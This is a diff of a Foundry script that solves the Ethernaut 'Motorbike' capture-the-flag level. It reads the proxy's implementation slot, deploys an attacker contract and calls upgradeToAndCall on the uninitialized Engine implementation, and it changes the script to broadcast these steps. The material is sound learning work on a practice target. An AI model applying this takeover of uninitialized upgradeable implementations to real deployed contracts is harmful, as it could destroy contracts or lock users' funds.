@@ -15,7 +15,9 @@ contract Solve is SolveScript("MOTORBIKE") {
         target = Motorbike(instance);
     }
 
-    function attack() public override {
+    function pwn() public {
+        vm.startBroadcast();
+
         // internal implementation slot from the contract
         bytes32 addrByte = vm.load(address(target), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
         Engine engine = Engine(address(uint160(uint256(addrByte))));
@@ -26,5 +28,11 @@ contract Solve is SolveScript("MOTORBIKE") {
         // deploy new initialization i.e. our attacker
         Attacker attacker = new Attacker();
         engine.upgradeToAndCall(address(attacker), abi.encodePacked(Attacker.pwn.selector));
+
+        vm.stopBroadcast();
+    }
+
+    function attack() public override {
+        // do nothing here, so it just submits the level
     }
 }
